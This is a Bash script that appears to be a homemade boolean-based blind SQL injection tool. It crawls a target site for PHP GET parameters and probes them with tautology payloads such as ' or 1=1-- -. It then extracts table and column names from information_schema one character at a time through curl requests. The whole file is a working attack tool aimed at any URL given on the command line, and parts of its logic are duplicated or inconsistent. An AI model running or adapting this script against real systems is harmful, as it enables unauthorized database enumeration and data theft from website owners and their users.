#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"


function ctrl_c(){
  echo -e "\n\n${redColour}[!] Saliendo...${endColour}"
  tput cnorm
  rm -rf /tmp/valid_response.txt &>/dev/null 
  rm -rf /tmp/fail_response.txt &>/dev/null
  exit 1 
}

#Ctrl_C
trap ctrl_c INT

function logo(){
  
  echo -e "\n\n${redColour}"'               ""#    #                    ""#                        '
  echo -e '  mmm    mmmm    #    #mmm    mmm    mmm     #     mmm    mmm   m mm  '
  echo -e ' #   "  #" "#    #    #" "#  #" "#  #" "#    #    #"  #  "   #  #"  # '
  echo -e '  """m  #   #    #    #   #  #   #  #   #    #    #""""  m"""#  #   # '
  echo -e ' "mmm"  "#m##    "mm  ##m#"  "#m#"  "#m#"    "mm  "#mm"  "mm"#  #   # '
  echo -e '            #                                                         '
  echo -e '            "                                                         '"${greenColour}"
  echo "                ┓ ┓•   ┓  •  •    •    "
  echo "                ┣┓┃┓┏┓┏┫  ┓┏┓┓┏┓┏╋┓┏┓┏┓"
  echo "                ┗┛┗┗┛┗┗┻  ┗┛┗┃┗ ┗┗┗┗┛┛┗"
  echo -e "                             ┛         \n\n${endColour}"
}

function helPanel(){
  logo
  echo -e "\n${yellowColour}Parameters: "
  echo -e "\t ${purpleColour}t)${endColour} Specify URL or IP Address where SQL could be located"
  echo -e "\t ${purpleColour}p)${endColour} Specify PORT (80 by default)"
  echo -e "\t ${purpleColour}s)${endColour} Scan and test for any vulnerable GET parameters"
  echo -e "\t ${purpleColour}G)${endColour} Specify that vulnerable field is PHP parameter (add as argument the name of the parameter)"
  echo -e "\t ${purpleColour}c)${endColour} Check if field seems vulnerable"

}

function port_checker(){
  if [ $port ] && [ $port -ne 80 ] ; then
    if [[ $port -gt 1 ]] && [[ $port -lt 65535 ]]; then
      final_port=":$port"
      port_checker_n=1
    else
      echo -e "\n${redColour}[!] Invalid PORT\n"
      ctrl_c
    fi
  elif [ ! $port ] || [ $port -eq 80 ] ; then
    port_checker_n=1
  fi


}

function url_checker(){ 

  protocol=$(echo $url | grep -Po '.*(?=://)' || echo "")
  domain_and_path=$(echo $url | grep -Po '(?<=://).*' || echo $url)
  domain=$(echo $domain_and_path | grep -Po '^[^/]+')
  path=$(echo $domain_and_path | grep -Po '(?<=/).*')


  if [[ -z "$protocol" ]]; then
    if [[ -z "$path" ]]; then
      final_url="$domain$final_port"
    else
      final_url="$domain$final_port/$path"
    fi
  else
    if [[ -z "$path" ]]; then
      final_url="$protocol://$domain$final_port"
    else
      final_url="$protocol://$domain$final_port/$path"
    fi
  fi

  timeout 5 curl -k --head -s --fail $final_url &>/dev/null
  if [ ! $? -eq 0 ]; then
    echo -e "\n${redColour}[!] Invalid URL. No connectivity to the URL.\n"
    ctrl_c
  else
    url_checker_n=1
  fi

}

function checker() {
  declare -a payloads
  declare -a possible_payloads
  payloads=("' or 1=1" " or 1=1" "' or 1=1-- -" " or 1=1-- -" "\" or 1=1" "\" or 1=1-- -" "\" or \"1\"=\"1\"")
  accepted_responde=0
  payloadfound=0
  if [ $php_parameter_ok ]; then

    curl -i -L -X GET "$url" -G --data-urlencode "$php_parameter=1203128" > /tmp/fail_response.txt 2>/dev/null

    for elemento in "${payloads[@]}"; do 

      accepted_responde=0
      curl -s -i -L -X GET "$url" -G --data-urlencode "$php_parameter=1203128$elemento" > /tmp/valid_response.txt 2>/dev/null
      cat /tmp/valid_response.txt | grep "500 Internal Server Error" &>/dev/null
  
      if [ ! $? -eq 0 ]; then
        fail_response=$(cat /tmp/fail_response.txt)
        valid_response=$(cat /tmp/valid_response.txt)
        sed -i '/^Date:/d' /tmp/fail_response.txt 
        sed -i '/^Date:/d' /tmp/valid_response.txt
        valid_content=$(comm -23 <(sort /tmp/valid_response.txt) <(sort /tmp/fail_response.txt))

        if [[ $fail_response != $valid_response ]]; then 
          possible_payloads+=("$elemento")  
          if [ ! $begin_payload ]; then 
            begin_payload=$elemento
            begin_payload="${begin_payload%%or*}or" 
          fi
        fi
      fi
    done
    if [ $checker_ok -eq 1 ]; then
      clear 
      logo
      for hello in "${possible_payloads[@]}"; do
        echo -e "\n\n[${greenColour}+${endColour}]${greenColour} A different response to the payload was found \"$hello\"${endColour}\n"
      done
    fi
  fi
  if [ $checker_ok -eq 1 ]; then 
    ctrl_c
  fi
}

function scan(){
  clear 
  logo
  echo -e "${greenColour}[+]${endColour} Scaning website for php parameters...\n"
  php_process=$(curl -X GET $final_url 2>/dev/null | grep -Eo "[a-zA-Z0-9_/\\-]+\.php\?[^\"\']*")
  for entry in $php_process; do 
    path_proccesed="$(echo $entry | grep -Eo "^[A-Za-z0-9_/\\-]+").php"

    php_parameter=$(echo $entry | grep -Eo "\?.*" | sed 's/^?//' | sed 's/=.*//')

    php_parameter_ok=1 
    echo -e "\t${yellowColour}[+]${endColour} Found PHP file ${redColour}$path_proccesed${endColour} attending to ${redColour}$php_parameter${endColour} parameter. \n"
    checker
  done
  if [ $php_parameter_ok -eq 0 ]; then 
    echo -e "${redColour}[!] No PHP file was found${endColour}"
  fi
  ctrl_c

}

function dump_tables(){
  declare -a tables  
  declare -a columns
  checker
  tput civis
  counter=33
  counter_character=1
  counter_table=0
  limit_oportunities=0
  while true; do
    character_valid=0
    curl -s -i -L -X GET "$url" -G --data-urlencode "id=1203128$begin_payload (select(select ascii(substring(table_name,$counter_character,1)) from information_schema.tables where table_schema = database() order by table_name limit 1 offset $counter_table)=$counter)" | grep "$valid_content" &>/dev/null && character_valid=1
    
    value=$(printf "%x" $counter | tr -d '\n')
    tables[$counter_table]="${tables[$counter_table]}$(echo -n -e "\x$value")"
    print_line() {
      local width=$(( $1 + 1 ))
      local line="+"
      for (( i=0; i<$width; i++ )); do
        line="${line}-"
      done
      line="${line}+"
      echo -e "\t$line"
    }

    print_row() {
      local cell=$1
      local width=$2
      local line="| ${cell}"
      
      local spaces=$((width - ${#cell}))
      for (( j=0; j<$spaces; j++ )); do
        line="${line} "
      done
      line="${line}|"
      echo -e "\t$line"
    }

    cell_width=20
    clear
    logo
    echo -e "\n ${greenColour}[+]${endColour} Listing database ${yellowColour}tables${endColour} in use: \n"
    print_line $cell_width
    for element2 in "${tables[@]}"; do
      print_row "$element2" $cell_width
      echo -ne "\r"
      print_line $cell_width
      echo -ne "\r"
    done
    
    tables[$counter_table]=$(echo "${tables[$counter_table]}" | sed 's/.$//')


    if [ $character_valid -eq 1 ]; then
      limit_oportunities=0
      new_value=$(printf "%x" $counter | tr -d '\n')
      tables[$counter_table]="${tables[$counter_table]}$(echo -n -e "\x$new_value")"
      counter=32
      ((counter_character ++))
      character_valid=0
    fi 
    ((counter ++))
    if [ $counter -gt 127 ]; then
      printf "\033[F\033[K"
      counter=33
      counter_character=1
      ((counter_table ++))
      ((limit_oportunities ++))
      if [ $limit_oportunities -eq 2 ]; then
        printf "\033[F\033[K"
        tables_lenght=${#tables[@]}
        tables_lenght_total=$(($tables_lenght - 1))
        clear 
        logo
        echo -e "\n ${greenColour}[+]${endColour} Listing database ${yellowColour}tables${endColour} in use: \n"
        print_line $cell_width
        for element2 in ${tables[@]}; do
          print_row "$element2" $cell_width
          echo -ne "\r"
          print_line $cell_width
          echo -ne "\r"
        done
        sleep 5
        break

      fi
    fi
  done
  
  if [ -f ./database.txt ]; then 
    mv ./database.txt ./backup_database.txt 
  fi
  
  echo -e "------------------------------------" > database_information.txt 
  echo -e "|       ${purpleColour}DATABASE INFORMATION${endColour}       |" >> database_information.txt
  echo -e "------------------------------------\n" >> database_information.txt

  echo -e "The existing ${blueColour}tables${endColour} are: ${yellowColour}${tables[@]}${endColour}\n" >> database_information.txt

  if [ ${#tables[@]} -gt 0 ]; then 
    total_tables=0 
    for element2 in "${tables[@]}"; do 
      ((total_tables ++))
    done
    current_table=0
    counter=33
    counter_character=1
    counter_column=0 
    limit_oportunities=0
    while true; do 
      curl -s -i -X GET "$url" -G --data-urlencode "$php_parameter=1203128$begin_payload (select(select ascii(substring(column_name, $counter_character, 1)) from information_schema.columns where table_schema = database() and table_name = '${tables[$current_table]}' order by column_name limit 1 offset $counter_column)=$counter)" | grep "$valid_content" &>/dev/null && character_valid=1

      value=$(printf "\\$(printf '%o' "$counter")")
      columns[$counter_column]=$(echo -ne "${columns[counter_column]}$value")
 
      print_line() {
      local width=$(( $1 + 1 ))
      local line="+"
      for (( i=0; i<$width; i++ )); do
        line="${line}-"
      done
      line="${line}+"
      echo -e "\t$line"
      } 

      print_row() {
        local cell=$1
        local width=$2
        local line="| ${cell}"
      
        local spaces=$((width - ${#cell}))
        for (( j=0; j<$spaces; j++ )); do
          line="${line} "
        done
        line="${line}|"
        echo -e "\t$line"
      }

    cell_width=20
    clear
    logo
    echo -e "\n ${greenColour}[+]${endColour} Listing ${yellowColour}columns${endColour} from ${redColour}${tables[0]}${endColour}: \n"
    print_line $cell_width
    for element2 in "${columns[@]}"; do
      print_row "$element2" $cell_width
      echo -ne "\r"
      print_line $cell_width
      echo -ne "\r"
    done

    columns[$counter_column]="${columns[$counter_column]::-1}"
    
      if [ $character_valid -eq 1 ]; then
        limit_oportunities=0 
        new_value=$(printf "\\$(printf '%o' "$counter")")
        columns[$counter_column]=$(echo -ne "${columns[counter_column]}$new_value")
        counter=32
        ((counter_character ++))
        character_valid=0
      fi
      ((counter ++))
      if [ $counter -gt 127 ]; then
        counter=33
        counter_character=1
        ((counter_column ++))
        ((limit_oportunities ++))
        if [ $limit_oportunities -eq 2 ]; then
          ((current_table ++))
          if [ ${tables[$current_table]} ]; then
            counter=33
            counter_character=1
            counter_column=0 
            limit_oportunities=0
          else 
            clear
            printf "\033[F\033[K"
            columns_lenght=${#columns[@]}
            columns_lenght_total=$(($columns_lenght - 1))
            logo
            echo -e "\n ${greenColour}[+]${endColour} Listing ${yellowColour}columns${endColour} from ${redColour}${tables[0]}${endColour}: \n"
            print_line $cell_width
            for element2 in ${columns[@]}; do
              print_row "$element2" $cell_width
              echo -ne "\r"
              print_line $cell_width
              echo -ne "\r"
            done
            break
          fi
        fi
      fi
    done 
    echo -e "The existing ${blueColour}columns${endColour} are: ${yellowColour}${columns[@]}${endColour}\n" >> database_information.txt
  fi

  if [ ${#columns[@]} -gt 0 ]; then 
    total_tables=0 
    for element2 in "${columns[@]}"; do 
      ((total_columns ++))
    done
    current_column=0
    counter=33
    counter_character=1
    counter_column=0 
    limit_oportunities=0
    while true; do 
      curl -s -i -X GET "$url" -G --data-urlencode "$php_parameter=1203128$begin_payload (select(select ascii(substring(column_name, $counter_character, 1)) from information_schema.columns where table_schema = database() and table_name = '${tables[$current_table]}' order by column_name limit 1 offset $counter_column)=$counter)" | grep "$valid_content" &>/dev/null && character_valid=1


      value=$(printf "\\$(printf '%o' "$counter")")
      columns[$counter_column]=$(echo -ne "${columns[counter_column]}$value")

      print_line() {
      local width=$(( $1 + 1 ))
      local line="+"
      for (( i=0; i<$width; i++ )); do
        line="${line}-"
      done
      line="${line}+"
      echo -e "\t$line"
      } 

      print_row() {
        local cell=$1
        local width=$2
        local line="| ${cell}"
      
        local spaces=$((width - ${#cell}))
        for (( j=0; j<$spaces; j++ )); do
          line="${line} "
        done
        line="${line}|"
        echo -e "\t$line"
      }

    cell_width=20
    clear
    logo
    echo -e "\n ${greenColour}[+]${endColour} Listing ${yellowColour}columns${endColour} from ${redColour}${tables[0]}${endColour}: \n"
    print_line $cell_width
    for element2 in "${columns[@]}"; do
      print_row "$element2" $cell_width
      echo -ne "\r"
      print_line $cell_width
      echo -ne "\r"
    done

    columns[$counter_column]="${columns[$counter_column]::-1}"
    
      if [ $character_valid -eq 1 ]; then
        limit_oportunities=0 
        new_value=$(printf "\\$(printf '%o' "$counter")")
        columns[$counter_column]=$(echo -ne "${columns[counter_column]}$new_value")
        counter=32
        ((counter_character ++))
        character_valid=0
      fi
      ((counter ++))
      if [ $counter -gt 127 ]; then
        counter=33
        counter_character=1
        ((counter_column ++))
        ((limit_oportunities ++))
        if [ $limit_oportunities -eq 2 ]; then
          ((current_table ++))
          if [ ${tables[$current_table]} ]; then
            counter=33
            counter_character=1
            counter_column=0 
            limit_oportunities=0
          else 
            clear
            printf "\033[F\033[K"
            columns_lenght=${#columns[@]}
            columns_lenght_total=$(($columns_lenght - 1))
            logo
            echo -e "\n ${greenColour}[+]${endColour} Listing columns from ${redColour}${tables[0]}${endColour}: \n"
            print_line $cell_width
            for element2 in ${columns[@]}; do
              print_row "$element2" $cell_width
              echo -ne "\r"
              print_line $cell_width
              echo -ne "\r"
            done
            break
          fi
        fi
      fi
    done
  fi
  tput cnorm
  rm -rf /tmp/valid_response.txt &>/dev/null 
  rm -rf /tmp/fail_response.txt &>/dev/null

} 


declare -i url_ok=0 
declare -i php_parameter_ok=0 
declare -i post_field_ok=0
declare -i scan_ok=0
declare -i checker_ok=0 

while getopts "t:p:sG:P:c" arg; do 
  case $arg in
    t) url=$OPTARG; url_ok=1 ;;
    p) port=$OPTARG; port_ok=1 ;;
    s) scan_ok=1 ;;
    G) php_parameter=$OPTARG; php_parameter_ok=1 ;;
    P) post_field=$OPTARG; post_field_ok=1 ;;
    c) let checker_ok=1

  esac
done

if [[ $url_ok -eq 1 ]] && [[ $checker_ok -eq 1 ]]; then
  if [[ $php_parameter_ok -eq 1 ]] || [[ $post_field_ok -eq 1 ]] ; then
    port_checker_n=0 
    url_checker_n=0 
    port_checker
    url_checker
    if [[ $url_checker_n -eq 1 ]] && [[ $port_checker_n -eq 1 ]]; then
      checker 
    fi 
  fi
elif [ $url_ok -eq 1 ]; then
  port_checker_n=0
  url_checker_n=0 
  port_checker
  url_checker
  if [[ $url_checker_n -eq 1 ]] && [[ $port_checker_n -eq 1 ]]; then
    if [ $scan_ok -eq 1 ]; then
      scan 
    fi
    dump_tables
  fi
else
  helPanel
fi

